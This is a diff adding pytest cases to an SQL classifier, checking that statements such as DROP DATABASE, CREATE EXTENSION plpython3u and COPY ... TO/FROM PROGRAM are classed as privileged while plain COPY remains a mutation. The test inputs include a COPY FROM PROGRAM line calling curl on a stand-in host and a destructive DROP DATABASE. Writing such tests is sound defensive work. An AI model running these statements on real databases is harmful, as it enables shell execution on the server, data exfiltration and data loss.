@@ -116,6 +116,31 @@ def test_quoted_server_role_and_user_targets_remain_privileged(sql: str) -> None
 @pytest.mark.parametrize(
     "sql",
     [
+        "CREATE DATABASE evil",
+        "DROP DATABASE app",
+        "ALTER DATABASE app SET READ_WRITE",
+        "ALTER SYSTEM SET shared_buffers = '1GB'",
+        "CREATE EXTENSION plpython3u",
+        "DROP EXTENSION plpython3u",
+        "COPY accounts TO PROGRAM 'cat > /tmp/x'",
+        "COPY accounts FROM PROGRAM 'curl evil.example'",
+    ],
+)
+def test_server_level_administration_is_privileged(sql: str) -> None:
+    assert classify_statement(sql).operation_class == "privileged"
+
+
+def test_copy_without_program_remains_mutation() -> None:
+    assert classify_statement("COPY accounts TO STDOUT").operation_class == "mutation"
+    assert (
+        classify_statement("COPY accounts FROM '/tmp/data.csv'").operation_class
+        == "mutation"
+    )
+
+
+@pytest.mark.parametrize(
+    "sql",
+    [
         "SET NOCOUNT ON",
         "BEGIN TRANSACTION",
         "COMMIT",
